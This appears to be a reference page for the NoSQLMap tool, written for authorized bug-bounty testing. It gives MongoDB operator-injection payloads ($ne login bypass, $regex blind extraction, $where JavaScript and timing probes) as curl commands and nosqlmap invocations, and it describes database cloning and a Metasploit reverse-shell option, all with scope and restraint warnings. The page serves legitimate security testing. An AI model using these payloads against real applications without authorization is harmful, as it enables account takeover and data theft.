---
name: "nosqlmap"
categories:
  - blackarch-webapp
version: "304.5a6dc7a"
homepage: "https://github.com/tcstool/NoSQLMap"
packaged-by: [blackarch]
blackarch-builddate: "2026-02-21"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "tcstool/NoSQLMap"
github-stars: 3375
github-pushed: "2026-10-13"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 5.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
last-refresh: "2026-11-19"
github-commits-year: 4
gh-activity-checked: "2026-11-09"
---

# nosqlmap

> Automated MongoDB/NoSQL exploitation: injection attacks, default-configuration abuse, and database cloning, from a menu or a script.

## What it's for

NoSQLMap audits and exploits NoSQL databases and the web applications built on them — presently MongoDB and CouchDB. It automates injection attacks, abuses default configurations such as unauthenticated management ports, can clone a victim database to a local MongoDB instance, and cracks password hashes. Named as a tribute to sqlmap. It exposes both an interactive menu and a flag-driven mode for scripting; the packaged version runs on Python 2. Originally authored by tcstool and now maintained by codingo.

## Typical use cases

### Run the interactive attack console

```
nosqlmap
```

Outcome: opens the numbered main menu — set options, NoSQL DB access attacks, NoSQL web app attacks, and a scan for anonymous MongoDB access — and walks through target, URI, and method settings in a wizard.

### Script a web application injection attack

```
nosqlmap --attack 2 --victim target.example.com --webPort 8080 --uri "/acct.php?acctid=test" --httpMethod GET --params 1 --injectSize 4 --injectFormat 2 --doTimeAttack n
```

Outcome: runs the web-app attack directly against the given URI without menu interaction, reporting which parameters accept injection and which payload format succeeded — suitable for batch runs against a lab of vulnerable applications.

## Bug bounty workflow with nosqlmap

NoSQLMap is a confirmation-and-payload tool, not an autopilot. It is Python 2, menu-first, and its scriptable surface is three attack modes (`--attack 1|2|3`). Treat it the way you treat [[sqlmap]]: it embeds the right payloads and the right oracle logic, but on a modern target you run it to *confirm* a candidate you already found by hand, and you keep the one-request manual `curl`/Burp version next to it for the report. The actual money in NoSQL injection is **operator injection** — the attacker smuggles a query operator (`$ne`, `$gt`, `$regex`, `$where`) where the app expected a scalar — and most of that is faster to do by hand than through the wizard. Use the phases below to decide when the tool earns its place.

The single most productive sentence for a document-DB target: **type validation is not query sanitization.** A schema layer that checks "is `password` a string?" does nothing if the handler builds its filter from the raw parsed body *before* the cast, or types the field as `Any`/`dict`/`object`. The value `{"$ne": null}` is a perfectly valid JSON object; it only becomes an injection when it reaches `collection.find()` as a filter instead of a string.

### How it maps onto the sqlmap workflow you already know

| sqlmap concept | NoSQLMap equivalent | Honest difference |
|---|---|---|
| `-u`/`--data` target | `--victim` + `--webPort` + `--uri` + `--httpMethod` + `--postData` | NoSQLMap builds the URL as `[https]://[victim]:[webPort]/[uri]` |
| `-r request.txt` (request file) | Menu **`a` — "Load options from saved Burp request"** | Burp-save only, interactive menu only — there is no `--requestFile` CLI flag |
| `-p` parameter selection | `--params` (GET, 1-based indices) / `--injectedParameter` (POST index) | NoSQLMap targets by position, not name |
| `--technique` | Fixed families: operator, `$where` JS, `this!=`, timing | Not selectable à la carte; `--doTimeAttack y/n` is the only toggle |
| `--dump` | DB Access menu → *Enumerate* / *Clone a Database* (direct connection only) | Web-app injection does blind extraction via `getDBInfo`; cloning is a *direct DB* feature, not a web one |
| `--os-shell` | DB Access menu → *Launch Metasploit Exploit for Mongo < 2.2.4* | Real exploitation — out of scope for almost every web bounty |

The request-file parallel is the most useful import path: capture the vulnerable request in Burp, *Save item*, then load it through menu option `a` to populate victim/port/URI/method/params/headers in one step — the same ergonomics as `sqlmap -r`, minus a CLI flag for scripting.

### Phase 0 — Confirm the target actually speaks a document DB

Goal: establish that a NoSQL backend is reachable through the parameter, and capture a clean baseline response to diff against. NoSQLMap's web attack already does this (it sends a normal request first and records length + time), but you want the baseline in your own notes.

```bash
# baseline: the untouched request, recorded verbatim
curl -s -D - -o /dev/null -w 'len=%{size_download} t=%{time_total}\n' \
  'https://app.example.com/search?q=test'
```

Signals that say "document DB underneath":

- A JSON API that accepts a body and a login/search/filter endpoint — the classic Express/Mongoose and FastAPI+Motor/Beanie shape.
- Operator smuggling changes the result set: `q[$ne]=test` returns *more* rows than `q=test`.
- Error strings on a malformed `$where`: NoSQLMap's `errorTest()` flags responses containing `ReferenceError`, `SyntaxError`, or `ILLEGAL` — these are V8/SpiderMonkey/MongoDB JavaScript-engine errors, a strong document-DB tell.
- `cross-reference`: the NoSQL section of the FastAPI methodology ([[fastapi-bug-bounty]] §4.2) covers the same operator-injection class from the framework side.

### Phase 1 — Map injectable parameters into a candidate list

Goal: a table of `endpoint × parameter × where-it-rides` (query string, form field, JSON body key, header). Every parameter that reaches a filter is a candidate; the highest-value ones are on authentication, search, and listing endpoints.

NoSQLMap addresses parameters **by position**, so decide the index before you script it: `--params 1` injects the first query parameter, `--injectedParameter 2` the second POST parameter. For JSON-body APIs the tool is awkward (its `--postData` is a flat `param,value,param,value` form list), so for JSON you will usually test by hand and only fall back to the tool for GET/form endpoints.

### Phase 2 — Operator injection and authentication bypass (the money)

Goal: turn a scalar parameter into a query operator and watch authorization or filtering collapse. This is where NoSQL injection pays, and the payloads are short.

The two carriers:

```bash
# (a) form-encoded bracket operator — works where the framework parses
#     bracket notation into nested objects (Express `qs`, PHP arrays)
curl -s -i 'https://app.example.com/login' \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password[$ne]=x'

# (b) JSON-body operator — works where the handler passes parsed JSON
#     straight into find()/findOne()
curl -s -i https://app.example.com/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
```

Secure behavior: `401`. Finding: `200` plus a session cookie or token is an **authentication bypass (Critical)** — the app compared the stored hash against *"anything that is not null"* instead of a password. `{"$gt":""}` and `{"$ne":""}` are equivalent probes; NoSQLMap's web module fires `param[$ne]=<random>` (`uriArray[1]`) and `param[$gt]=` (empty, `uriArray[8]`) automatically on each selected parameter.

To let the tool drive the same tests against a GET endpoint:

```bash
nosqlmap --attack 2 --victim app.example.com --webPort 443 --https ON \
  --uri "/search?q=test" --httpMethod GET --params 1 \
  --injectSize 6 --injectFormat 1 --doTimeAttack n --savePath nosql-out.txt
```

`--injectFormat` picks the random baseline alphabet (`1`-Alphanumeric, `2`-Letters only, `3`-Numbers only, `4`-Email address) and `--injectSize` its length — match them to what the parameter normally accepts so the baseline request is realistic. `--doTimeAttack n` keeps this pass low-impact (see Phase 4 for why `y` is a DoS risk).

### Phase 3 — Blind extraction with `$regex` and boolean oracles

Goal: when the response does not return the secret directly, recover it one character at a time through a true/false oracle — the NoSQL analogue of blind SQLi.

```bash
# anchored regex: does the password start with 'a'? (true -> login/behaves differently)
curl -s -i https://app.example.com/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
# widen the anchor one char at a time: ^a, ^ab, ^abc ...
```

NoSQLMap automates the same idea inside `getDBInfo()`: it extracts the database name, usernames, and 32-character password hashes character by character (substituting boolean `if (...) { return true; }` conditions into its `$where` probes), then hands the recovered hashes to `nsmmongo.passCrack` for an offline MONGODB-CR dictionary/brute attack (`md5(user + ":mongo:" + password)`). For bug bounty, **recover only enough to prove the oracle** — three or four characters of a value you are authorized to read — never the whole table.

Keep this single-request-paced: each probe is one request, and anchored-regex extraction is linear in the secret length, not exponential. That is low-volume by construction — do not parallelize it into a flood.

### Phase 4 — `$where` JavaScript injection and the timing oracle

Goal: reach the server-side JavaScript evaluator. MongoDB's `$where` runs attacker-supplied JS in the query engine — the highest-severity document-DB sink.

NoSQLMap's web module carries the escapes verbatim (labeled "Mongo <2.4" in the source):

```
string context:  a'; return db.a.find(); var dummy='!
integer context: 1; return db.a.find(); var dummy=1
boolean form:    a'; return this.a != '<random>'; var dummy='!
```

The manual equivalent against a JSON filter:

```bash
curl -s -i https://app.example.com/api/items -H 'Content-Type: application/json' \
  -d '{"$where":"return true"}'
```

A differential (more rows, an error, a timing change) confirms JS evaluation. **Restraint:** NoSQLMap's timing test does not call `sleep()` — it spins a busy-loop on `new Date()` for ~10 seconds and flags any response slower than 25 seconds. That is a per-probe CPU burn on a shared query worker and a genuine DoS risk. Leave `--doTimeAttack n` unless timing is explicitly permitted; if it is, send *one* short probe and stop:

```bash
# single, short timing probe — observe, then stop (authorized engagements only)
curl -s -o /dev/null -w '%{time_total}\n' https://app.example.com/api/items \
  -H 'Content-Type: application/json' -d '{"$where":"sleep(2000)"}'
```

Why validation misses all of this: a Mongoose/Pydantic string field or an `express-validator` `isString()` check validates the *leaf value* — it does not stop a parameter whose value is an object, and it does not run at all when the query is built from `req.query`/`req.body` before casting. The fix is structural (reject non-string types, cast explicitly, use parameterized operators, disable server-side JS), which is exactly what you recommend in the report.

### Phase 5 — Direct database exposure (`--attack 1` and `--attack 3`) — handle with care

`--attack 1` (DB Access) and `--attack 3` (Scan for Anonymous Access) leave the web layer and talk to the database port directly. These are usually **infrastructure** findings — in scope only when the program lists the DB host/port, and governed by much stricter rules than a web injection.

```bash
# scope check first: is the Mongo/Couch port even reachable and in scope?
nosqlmap --attack 1 --platform MongoDB --victim 198.51.100.10 --dbPort 27017
```

`--attack 1` begins with an *unauthenticated* connection attempt (`mongoScan`) and also probes the legacy HTTP management interface on port 28017 (`/listDatabases?text=1`). If anonymous access succeeds, that alone — "MongoDB answers with no credentials" — is the finding. The DB-access menu then offers *Get Server Version*, *Enumerate Databases/Collections/Users*, *Check for GridFS*, *Clone a Database*, and *Launch Metasploit Exploit for Mongo < 2.2.4*. **Stop at version + a count.** Everything past enumeration is over the line for a bounty (see Pitfalls). CouchDB (`--platform CouchDB`, port 5984) mirrors this with `/_utils`, `/_users/_all_docs`, and version checks.

---

## Where the money is with nosqlmap

| Priority | Finding class | NoSQLMap feature / manual payload | Typical severity | Dupe risk |
|---|---|---|---|---|
| 1 | Authentication bypass via operator injection | `--attack 2` `$ne`/`$gt` tests · `{"password":{"$ne":null}}` / `password[$ne]=x` | Critical | Low–Med |
| 2 | `$where` server-side JavaScript injection | `--attack 2` `$where`/`this!=` tests · `{"$where":"return true"}` | High–Critical | Low |
| 3 | Blind data extraction (regex/boolean oracle) | `getDBInfo()` char-by-char · `{"password":{"$regex":"^a"}}` | High–Critical | Med |
| 4 | Filter/operator injection → data disclosure, broken listing | `--attack 2` operator family · `?filter[$gt]=` | High | Med |
| 5 | Unauthenticated MongoDB/CouchDB exposure | `--attack 3` massScan · `--attack 1` direct connect | High–Critical (often infra/out-of-scope) | Med |
| 6 | Timing/`$where` resource exhaustion (DoS) | `--doTimeAttack y` (busy-loop) | Medium | High (noisy) |
| 7 | Verbose NoSQL error disclosure | `errorTest()` → `ReferenceError`/`SyntaxError`/`ILLEGAL` | Low–Info | High |

Priorities 1–4 are the web-injection payouts and the safe centre of the tool. 5 is high-value but usually an infrastructure/scope question. 6 and 7 are amplifiers and recon, not standalone wins — and 6 carries a DoS footprint that can get a report rejected.

---

## Command recipes

Each block is a real command, the low-volume setting called out, and the output to expect. All targets are `example.com` / TEST-NET.

**Scriptable GET web-app attack (program-safe default).** One parameter, no timing, results saved:

```bash
nosqlmap --attack 2 --victim app.example.com --webPort 443 --https ON \
  --uri "/search?q=test" --httpMethod GET --params 1 \
  --injectSize 6 --injectFormat 1 --doTimeAttack n --savePath nosql-out.txt
# -> sends baseline + operator ($ne/$gt), $where, and this!= probes on param #1;
#    prints "vulnerable" / "possibly vulnerable" URLs; appends them to nosql-out.txt
```

`checkResult()` calls a hit when the response length differs from the random baseline by ≥100 bytes (smaller nonzero deltas are "possible"). That heuristic false-positives on pages with CSRF tokens, timestamps, or ads — always reproduce the differential by hand before believing it.

**POST / form endpoint.** Inject the second POST parameter, carry a session header:

```bash
nosqlmap --attack 2 --victim app.example.com --webPort 443 --https ON \
  --uri "/login" --httpMethod POST --postData "username,admin,password,test" \
  --injectedParameter 2 --requestHeaders "Cookie,session=REDACTED" --doTimeAttack n
# -> replays the form with operator payloads substituted into parameter #2 (password)
```

Note: `--postData` is a flat form list, so this fits `application/x-www-form-urlencoded` login forms. For a JSON API, drive the payloads with `curl` (Phase 2) — the tool does not serialize nested JSON operators cleanly.

**Import a Burp request (the `-r` analogue).** Interactive only:

```
nosqlmap
# 1-Set options  ->  a-Load options from saved Burp request  ->  (pick the saved file)
# then x-Back to main menu  ->  3-NoSQL Web App attacks
```

This populates victim, web port, URI, method, parameters, and headers from a Burp *Save item* export — the fastest way to aim the web attack at a request you already captured.

**Manual operator injection (confirmation + PoC).** What you paste into the report:

```bash
# auth bypass, JSON body
curl -s -i https://app.example.com/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
# auth bypass, form-encoded bracket operator
curl -s -i https://app.example.com/login \
  --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
# -> secure: 401. finding: 200 + Set-Cookie / token
```

**Anonymous DB exposure — single in-scope host only.** Never a subnet in bug bounty:

```bash
nosqlmap --attack 1 --platform MongoDB --victim 198.51.100.10 --dbPort 27017 --verb ON
# -> attempts an unauthenticated connection; reports version + anonymous-access status.
#    STOP here for the PoC — do not enumerate/clone.
```

`--attack 3` exists for sweeping a range or an IP file, but see Pitfalls: scanning anything beyond a single confirmed-in-scope IP is a scope violation.

---

## Pitfalls, noise and scope discipline

**`--attack 3` subnet scanning hits out-of-scope hosts.** `massScan` expands a CIDR with `ipcalc.Network(subnet)` or reads an IP list, then probes Mongo on 27017 and Couch on 5984. A bug-bounty scope is specific hosts, not a range — point it at a single confirmed-in-scope IP (or a file containing only in-scope IPs), never a netblock. Unsolicited scanning of adjacent hosts is the fastest way to get banned from a program.

**Cloning a database is exfiltration, not proof.** The DB-access menu's *Clone a Database* (`stealDBs`) copies the entire victim database to your local MongoDB as `<name>_stolen`. That moves real data off the target — far beyond a proof of concept and often a legal line. Prove access with the server version and a single record count; never clone.

**`Launch Metasploit Exploit` is active exploitation.** Menu option 5 runs `msfcli exploit/linux/misc/mongod_native_helper` with a reverse-shell payload against Mongo < 2.2.4. That is RCE against a production host — essentially never in scope for a web bounty and potentially destructive. Do not run it.

**`--doTimeAttack y` is a DoS footprint.** The timing test busy-loops on `new Date()` for ~10 seconds per probe (flagging responses over 25 s) rather than yielding with `sleep()`, so it pins a query worker. Across multiple parameters that is sustained CPU load on a shared backend. Default to `n`; only enable it where timing tests are explicitly permitted, and prefer a single short manual probe.

**The tool is Python 2 and targets old stacks.** It expects `pymongo` APIs (`database_names()`, `copy_database()`) removed in pymongo 4, and MongoDB disabled server-side JavaScript (`$where`, `$function`) by default from 4.0+ and dropped the HTTP interface (port 28017) back in 3.6. Many `$where` and direct-DB paths will simply no-op or error against a current target. A clean NoSQLMap run is **not** evidence of "no vulnerability" — it may mean the tool could not engage. Confirm negatives by hand.

**Length-delta heuristics false-positive.** `checkResult()`'s 100-byte rule flags dynamic pages that change for reasons unrelated to injection. Every tool "hit" needs a manual reproduction with a stable differentiator (status change, row-count change, extracted character) before it goes in a report.

**Payloads execute real server-side code.** `$where` strings run attacker JavaScript in the DB engine, and the bundled probes call `db.a.find()`. Keep every payload read-only — never inject `update`, `remove`, `drop`, or write operations against a live target. The point is to demonstrate reachability, not to change data.

**Scope `--params` tightly.** The web attack fires ~19 test URLs per selected parameter per family; selecting every parameter multiplies request volume for no benefit. Target the one parameter you are testing.

---

## Reporting evidence

Capture, for every finding:

- **The request pair, verbatim.** The baseline request (untouched scalar) and the injected request (operator/`$where` payload) — full method, path, headers, and body. This is the core of the PoC and the part a triager re-runs.
- **The response differential.** Status, `Content-Length`, and a trimmed body snippet showing *what changed*: the `Set-Cookie`/token on an auth bypass, the enlarged result set on a filter injection, the recovered character on a blind probe, or the `ReferenceError`/`SyntaxError`/`ILLEGAL` string on a `$where` error.
- **For blind extraction, the probe sequence and the minimum recovered value.** Show `^a → ^ad → ^adm …` and stop at enough characters to prove the oracle works — never dump the full secret or the whole collection.
- **Your manual `curl` confirmation alongside any tool output.** Triagers distrust raw tool logs; the `--savePath` file (the flagged URLs) is supporting evidence, the hand-run `curl` is the proof.
- **How you fingerprinted the backend.** The error string, behavior, or (if source is in scope) the `collection.find()` call that shows the parameter reaches a filter unsanitized — this is what pins severity and demonstrates root-cause understanding.
- **A root-cause remediation line.** Reject non-string types at the boundary, cast query parameters explicitly, use an operator allowlist, and disable server-side JavaScript (`$where`/`$function`) — the structural fix, not "validate input."
- **Never attach exfiltrated data.** No cloned database, no bulk records, no full hash table. The minimum that proves the claim is the maximum you should include. Clean up any test accounts or writes afterward.

Severity framing: authentication bypass or `$where` JS execution — Critical; cross-record data disclosure via operator injection — High; blind extraction of sensitive fields — High; timing/resource exhaustion — Medium (and note the DoS caveat); verbose DB errors — Low/Info.

---

## References

- NoSQLMap — maintained fork (codingo): https://github.com/codingo/NoSQLMap
- NoSQLMap — original repo (tcstool): https://github.com/tcstool/NoSQLMap
- NoSQLMap README (flags, menus, requirements): https://raw.githubusercontent.com/codingo/NoSQLMap/master/README.md
- Source consulted for flag/technique verification — `nosqlmap.py` (`build_parser`, `--attack` dispatch), `nsmweb.py` (`args()`: `--injectedParameter`/`--injectSize`/`--injectFormat`/`--params`/`--doTimeAttack`/`--savePath`; operator, `$where`, `this!=`, timing payloads), `nsmmongo.py` (`netAttacks`, `stealDBs`, `passCrack`, `msfLaunch`), `nsmscan.py` (`massScan`), `nsmcouch.py` (`netAttacks`, `couchScan`) — https://github.com/codingo/NoSQLMap/tree/master
- OWASP WSTG — Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- PayloadsAllTheThings — NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- MongoDB docs — `$where` server-side JavaScript: https://www.mongodb.com/docs/manual/reference/operator/query/where/
- Companion framework-side coverage: [[fastapi-bug-bounty]] §4.2 (NoSQL operator injection), and [[sqlmap]] for the SQL-injection sibling workflow

*Research supplement added 2026-11-16, grounded in the NoSQLMap README and source modules (nosqlmap.py / nsmweb.py / nsmmongo.py / nsmscan.py / nsmcouch.py at github.com/codingo/NoSQLMap), OWASP WSTG NoSQL injection, PayloadsAllTheThings, and MongoDB `$where` documentation; flag names and attack modes verified against the tool's argparse and module `args()` definitions (model: claude-opus-4-8).*
